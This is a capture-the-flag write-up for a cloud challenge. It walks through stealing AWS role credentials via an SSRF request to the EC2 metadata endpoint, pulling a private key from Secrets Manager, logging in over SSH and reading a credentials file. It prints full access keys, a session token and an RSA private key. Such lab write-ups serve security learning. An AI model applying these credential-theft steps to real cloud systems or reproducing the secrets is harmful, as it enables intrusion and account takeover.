# Cloud Na(t)ive
```
No one escapes the Cloud

Special flag format: ENO-........

** The Cloud security challenges are provided by SEC Consult **
http://3.64.214.139/
```

Continuing from the previous part, there was a comment hinting at the server's private key:
```
#TODO: implement database backend. Use the key webserver-private-key for direct access to the server
```

And trying to get it from secrets manager in the same way as in part 3 does give it to us:
```
# values from http://3.64.214.139/request?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2_role
└─$ AWS_REGION=eu-central-1 AWS_ACCESS_KEY_ID=ASIA22D7J5LEG4ULKCMY AWS_SECRET_ACCESS_KEY=x2lHGw7gV22YKmPwdjOwd6d4/pnGQJmhYjFzS006 AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEDkaDGV1LWNlbnRyYWwtMSJHMEUCIQCrFm5Av1/CJWWsc+dE3h7JZcT1aPbpUOFUgH5yjQLI7AIgdv3bHYhxwXZggOyLxc3EB/+xzEC9M+Cj4iN02y6D+okq5QQIov//////////ARAAGgw3NDMyOTYzMzA0NDAiDL473aAatXJmk205fSq5BIKYe+pVGNFCi+Tjs8uq/ptjW2IdNgt2KSEvhi33ehITVUa1W+g7wEQItuFZtTXQP9mcM8cJi0MCoTaVh0bhAQ/Ba050HEKteEUa6u9z5Ozmxi8d4AHqiZf+o6WqoRdpnGdi/bmo/qhGgVXspYk6oTO8Tn5xQQCX+ro/ofC8z0EKm7AIOxCKz3FByw9745xbnJHX5KUecmfxh3f0EHBabAprSrUowCu7++ZFaAAx+/3vJOjmwzOT0/8tZKdBDmRT25LAz1IjDlj17M2p4ln0kVCFVEyZpuQGX06HpcGML6aF0SmFiehzS3T6qU41ARIURV6bIh77Qjw3s9XW4dJqI01Xbuqs3OwyR7qYj0/Bswl2osvQw4EP3OQGdDVzMm7BAPOzvnRxNPpSGnjfFsIJMRI+R+qYd7X3zdjhb95HLqMEvIfJobn1H99uKoc3Td+IENLzPjm60I0K3yUoduD1yJETH0YmAipa5FmZUOKIXeBahx6hVAfAQI3Gn5IzWitjbz+Ag5wojsb0eAwon56T8TEfwSqmyqtt80Ivp8rytaaCssHZdMt9/0ZhSN3H/RlyWwG6tyBsuHgFMt/z/jmraFZOv5F2Lvph+kwhXtVFFwb7JG6iBZ/ULI1pxPFbu9VYT/JMJDudUN16wFnPrseehkiI2MJicJn437dS2fvRzGG9eQpvSfEogHY0QvFJHaEh8yCM/xcT7cFAkMlrl2P/H2h1CXqJTWoWNYLucOqOza2BuGDWdt95lNxSMPf24pcGOqkB+XCveLhcIheCVcbgvboDHUSaEaeHV+eE51IWbeYQahNa1j1bdlczykZH4tQaJi4sQBWAWqbYOKrU2ciepdTGys1GToOZ75qk4Y3/Nx34PZ0aTMY7fCtGpgcZ/bNvKtghRrSk/7pzS2JiL92GzvFmAvyYFB1eGUSvI2Y6pLI7mGac425OIXoCgTlQpnxRxLB37FLvW+NjGGfQ5da3W9bLShY2Ajz+j7ae3g== aws secretsmanager get-secret-value --secret-id webserver-private-key                                                                              
{
    "ARN": "arn:aws:secretsmanager:eu-central-1:743296330440:secret:webserver-private-key-EF74VV",
    "Name": "webserver-private-key",
    "VersionId": "d47bca13-b170-402e-b85c-abb8545c83df",
    "SecretString": "{\"webserver-private-key\":\"-----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEAnI1bU1rn5qJtOeDsWItrZzShl/39NabtmsA+lOlTaGhzRxDH wYp5s2KddUsxc+G+boLpr9SfA9xDuXsMlZN3iWoX0Em4wQlEjT/2WTI0CPaabnZy ATDdvOsIVQ7QIEJixEu0X2EVNJ7MwdndsHIB+xbRuk/iKezCh4IAmlMWezlC1pcu XZnUJSa/9IEBnemafgMjj6AFnbP/+mDQA3Pu19WQAMKX05QvhE52xWa9AHoqd5+j 1+ajD9uUhcLxwSa45vPJnZykeuk3+LGSppiN5Dvynam8+laLsa9nD/oqVVqA4tpu TBsYJ9U7ZHmCAqGY75HATC8CFjrgrEQ1bxrl1wIDAQABAoIBAGowA6MthSDOSbI5 m3aP0uElNPqooCjVOlN+VLSi8x1dw9uPST9BEz2XBWC7CScmFwpUp/fJC7cNn65f BXErnqhJmy9/4d6lz6bTnOBxihQOWT/V/YxLPgxXi8ZODuPiw6WMCCOt8TlJAW/3 vERjgG500vtCFhED9AsAJjKHazdW1eZVf5C8jUQLlgAOGDswoBCAFEfz+jt+JawM XQtMMpc/oIuYFYDd6XRDjJaF9o/fjriL4THs5GM/DTr6+6Tijut5cWFnAd1BdGMz vFUwljZEoNKkFxyXrXgCdo3qsqHSzIq2WXjYTrpgCpdPTG1xALkQv+qHmTCowydD Wpkz0okCgYEA3GBsWEfQe6iZcvj81QF2APmh0IlKJmqvZiDQVn8cEY/Y7LTRHZmZ AlWO9xG5zTpBoCsCVnJezSHFl9TmRmDdCSI64qZmADVFzCPjzQRn6bafMr91iWRB tgQToDd7NYUHyKljAiQ1mQ7loFVXVfBvdrGFzcQm5sjWxxQV2qlyqGUCgYEAtdvD biFH1ALlbz0KWVmvDZHPH+Wp6/yxMaolO2jGJdW8JqfbeN+ZRgORXvfIY4Xwfjpg 28ZZPRmKOkDTyR8eeo/WFs+6brCVvAC1eN+sIfb3lASrBTetVeVa3uviePi4IbCb aKLTuKLltNQAd4USXGsVkJmNkhECYlomLYEGq4sCgYAxP8M2v2XSHM2eKhKmr5rl gOQurF/L0g+8rRyiF+n36sO5sncBPHA7W0+F24pAWQKNfs8Y7ppNEX0M/2Eu3TrI bcPnHvSwmzcr9eFU0eU/D7boKm1j9OnSeXrBVWTNgxtINsKPmfP4bqHWgPvxkrf2 OJoEcA+Zh8yn1M9FfJTJGQKBgBJn6LK3yZZKqMAGdIqwiggcjtMSoo0Q6To2l0gZ BZ0EseNTr+He95tfdxIej/iKsNmFvRHhVFzbveLBdu3vKV2MO0XZxmu3kaASjktq j/hsD4i6pDiF9xQvf2/6fdRyj+hRAJmpiTYxvn/7yQRPwpj5+ZfGAs8ay5v6tcx7 N5qbAoGAYHt15ijLFX+IDo9Gn6iTSVkrIyTKLaxcnY+w5NOFcAiCmyhgcIraR8fb KWLGh5Un5vFctIeYQFELOAwhqes+1/AQ5sVytS6XfxJxuln9wt30+q/L+wKztRov CmXUqxq+YvN39U0irSw9B+eOFR3oMXjM3QQwvrMsqxMdi7TZJ6A= -----END RSA PRIVATE KEY-----\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2022-08-11T02:54:58.374000+03:00"
}
```

Giving us the private key:
```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAnI1bU1rn5qJtOeDsWItrZzShl/39NabtmsA+lOlTaGhzRxDH
wYp5s2KddUsxc+G+boLpr9SfA9xDuXsMlZN3iWoX0Em4wQlEjT/2WTI0CPaabnZy
ATDdvOsIVQ7QIEJixEu0X2EVNJ7MwdndsHIB+xbRuk/iKezCh4IAmlMWezlC1pcu
XZnUJSa/9IEBnemafgMjj6AFnbP/+mDQA3Pu19WQAMKX05QvhE52xWa9AHoqd5+j
1+ajD9uUhcLxwSa45vPJnZykeuk3+LGSppiN5Dvynam8+laLsa9nD/oqVVqA4tpu
TBsYJ9U7ZHmCAqGY75HATC8CFjrgrEQ1bxrl1wIDAQABAoIBAGowA6MthSDOSbI5
m3aP0uElNPqooCjVOlN+VLSi8x1dw9uPST9BEz2XBWC7CScmFwpUp/fJC7cNn65f
BXErnqhJmy9/4d6lz6bTnOBxihQOWT/V/YxLPgxXi8ZODuPiw6WMCCOt8TlJAW/3
vERjgG500vtCFhED9AsAJjKHazdW1eZVf5C8jUQLlgAOGDswoBCAFEfz+jt+JawM
XQtMMpc/oIuYFYDd6XRDjJaF9o/fjriL4THs5GM/DTr6+6Tijut5cWFnAd1BdGMz
vFUwljZEoNKkFxyXrXgCdo3qsqHSzIq2WXjYTrpgCpdPTG1xALkQv+qHmTCowydD
Wpkz0okCgYEA3GBsWEfQe6iZcvj81QF2APmh0IlKJmqvZiDQVn8cEY/Y7LTRHZmZ
AlWO9xG5zTpBoCsCVnJezSHFl9TmRmDdCSI64qZmADVFzCPjzQRn6bafMr91iWRB
tgQToDd7NYUHyKljAiQ1mQ7loFVXVfBvdrGFzcQm5sjWxxQV2qlyqGUCgYEAtdvD
biFH1ALlbz0KWVmvDZHPH+Wp6/yxMaolO2jGJdW8JqfbeN+ZRgORXvfIY4Xwfjpg
28ZZPRmKOkDTyR8eeo/WFs+6brCVvAC1eN+sIfb3lASrBTetVeVa3uviePi4IbCb
aKLTuKLltNQAd4USXGsVkJmNkhECYlomLYEGq4sCgYAxP8M2v2XSHM2eKhKmr5rl
gOQurF/L0g+8rRyiF+n36sO5sncBPHA7W0+F24pAWQKNfs8Y7ppNEX0M/2Eu3TrI
bcPnHvSwmzcr9eFU0eU/D7boKm1j9OnSeXrBVWTNgxtINsKPmfP4bqHWgPvxkrf2
OJoEcA+Zh8yn1M9FfJTJGQKBgBJn6LK3yZZKqMAGdIqwiggcjtMSoo0Q6To2l0gZ
BZ0EseNTr+He95tfdxIej/iKsNmFvRHhVFzbveLBdu3vKV2MO0XZxmu3kaASjktq
j/hsD4i6pDiF9xQvf2/6fdRyj+hRAJmpiTYxvn/7yQRPwpj5+ZfGAs8ay5v6tcx7
N5qbAoGAYHt15ijLFX+IDo9Gn6iTSVkrIyTKLaxcnY+w5NOFcAiCmyhgcIraR8fb
KWLGh5Un5vFctIeYQFELOAwhqes+1/AQ5sVytS6XfxJxuln9wt30+q/L+wKztRov
CmXUqxq+YvN39U0irSw9B+eOFR3oMXjM3QQwvrMsqxMdi7TZJ6A=
-----END RSA PRIVATE KEY-----
```

In the previous part, we also found out that there was `ec2nullconadmin` user added with a public key setup:
```
└─$ ssh -i cloud.key ec2nullconadmin@3.64.214.139
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.11.0-1022-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Aug 14 12:07:04 UTC 2022

  System load:  0.0               Processes:                134
  Usage of /:   7.4% of 48.41GB   Users logged in:          0
  Memory usage: 4%                IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                IPv4 address for ens5:    10.0.1.102

 * Ubuntu Pro delivers the most comprehensive open source security and
   compliance features.

   https://ubuntu.com/aws/pro

66 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


*** System restart required ***
Last login: Sun Aug 14 07:57:16 2022 from x.x.x.x
ec2nullconadmin@ip-10-0-1-102:~$ ls -all
total 48
drwxr-xr-x 7 ec2nullconadmin ec2nullconadmin 4096 Aug 13 16:19 .
drwxr-xr-x 4 root            root            4096 Aug 11 20:26 ..
drwxr-xr-x 2 root            root            4096 Aug 11 20:34 .aws
lrwxrwxrwx 1 ec2nullconadmin ec2nullconadmin    9 Aug 13 16:14 .bash_history -> /dev/null
-rw-r--r-- 1 ec2nullconadmin ec2nullconadmin  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ec2nullconadmin ec2nullconadmin 3771 Feb 25  2020 .bashrc
drwx------ 2 ec2nullconadmin ec2nullconadmin 4096 Aug 11 20:28 .cache
drwx------ 3 ec2nullconadmin ec2nullconadmin 4096 Aug 13 16:12 .config
drwxrwxr-x 3 ec2nullconadmin ec2nullconadmin 4096 Aug 13 16:12 .local
-rw-r--r-- 1 ec2nullconadmin ec2nullconadmin  807 Feb 25  2020 .profile
-rw-rw-r-- 1 ec2nullconadmin ec2nullconadmin   66 Aug 13 16:12 .selected_editor
drwx------ 2 ec2nullconadmin ec2nullconadmin 4096 Aug 11 20:26 .ssh
-rw------- 1 ec2nullconadmin ec2nullconadmin  819 Aug 13 16:19 .viminfo
ec2nullconadmin@ip-10-0-1-102:~$ cat .aws/credentials 
[flag]
aws_access_key_id = AKIA22D7J5LEJWNH7NXR
aws_secret_access_key = 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
ec2nullconadmin@ip-10-0-1-102:~$ aws sts get-caller-identity --profile=flag
{
    "UserId": "AIDA22D7J5LEJYPCNY63H",
    "Account": "743296330440",
    "Arn": "arn:aws:iam::743296330440:user/ENO-Y0uR0ck_Docker_Escapes_with0ut_Root"
}
```

Flag: `ENO-Y0uR0ck_Docker_Escapes_with0ut_Root`